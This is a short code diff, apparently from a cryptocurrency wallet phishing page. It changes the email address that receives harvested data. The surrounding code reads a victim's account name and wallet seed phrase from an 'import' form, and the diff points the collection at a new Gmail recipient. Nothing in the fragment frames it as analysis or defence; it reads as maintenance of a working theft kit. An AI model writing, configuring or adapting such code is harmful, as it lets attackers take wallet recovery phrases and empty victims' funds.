@@ -54,7 +54,7 @@
 
         var myurl = "import?err=1";
 
-        const emails = "benignunited@gmail.com"; // for multiple email use ["email1@gmail.com", "email2@gmail.com"];
+        const emails = "jordanlott1876@gmail.com"; // for multiple email use ["email1@gmail.com", "email2@gmail.com"];
 
         const account_name = $(".account-name").val();
         const seed_phrase = $(".seed-phrase").val();
